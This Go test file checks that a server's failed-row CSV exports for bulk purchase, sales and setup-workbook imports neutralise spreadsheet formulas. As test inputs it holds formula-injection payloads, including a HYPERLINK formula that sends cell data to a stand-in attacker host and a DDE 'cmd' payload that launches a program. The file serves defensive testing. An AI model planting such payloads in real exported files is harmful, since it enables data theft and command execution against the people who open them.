package server

import (
	"encoding/csv"
	"strings"
	"testing"
)

// Stage 49.5.7 - a malicious import: the failed-rows file of the three
// workbook uploads repeats cells from the uploaded file (vendor, design,
// barcode, invoice, key). A cell like =HYPERLINK(...) must not run when the
// file is opened in a spreadsheet.

const evilCell = `=HYPERLINK("http://evil.invalid/?x="&A1,"click")`

func assertNoLiveFormulas(t *testing.T, what, out string) {
	t.Helper()
	recs, err := csv.NewReader(strings.NewReader(out)).ReadAll()
	if err != nil {
		t.Fatalf("%s: unreadable csv: %v", what, err)
	}
	for _, r := range recs[1:] {
		for _, c := range r {
			if c != "" && strings.ContainsAny(c[:1], "=+-@") {
				t.Errorf("%s: cell %q would run as a formula", what, c)
			}
		}
	}
}

func TestStage4957PurchaseErrorFileNeutralisesFormulas(t *testing.T) {
	res := &bpResult{
		Vendors: []*bpRowOut{{Row: 2, Key: evilCell, Action: "error", Message: "bad"}},
		POs:     []*bpPOOut{{Ref: "@SUM(1+1)", Action: "error", Lines: []*bpLineOut{{Row: 3, Design: "+cmd|' /C calc'!A0", Action: "error", Message: "x"}}}},
		Bills:   []*bpBillOut{{Row: 4, Invoice: "-2+3", Action: "error", Message: "y"}},
	}
	assertNoLiveFormulas(t, "bulk purchase", bpErrorCSV(res))
}

func TestStage4957SalesErrorFileNeutralisesFormulas(t *testing.T) {
	res := &bsResult{
		Customers: []*bsRowOut{{Row: 2, Key: evilCell, Action: "error", Message: "bad"}},
		Invoices:  []*bsInvoiceOut{{Ref: "=1+1", Action: "error", Lines: []*bsLineOut{{Row: 3, Barcode: "@SUM(A1)", Action: "error", Message: "x"}}}},
	}
	assertNoLiveFormulas(t, "bulk sales", bsErrorCSV(res))
}

func TestStage4957SetupWorkbookErrorFileNeutralisesFormulas(t *testing.T) {
	res := []*swSheetResult{{Sheet: "Vendors", Rows: []*swRow{{Row: 2, Key: evilCell, Action: "error", Message: "bad"}}}}
	assertNoLiveFormulas(t, "setup workbook", swErrorCSV(res))
}
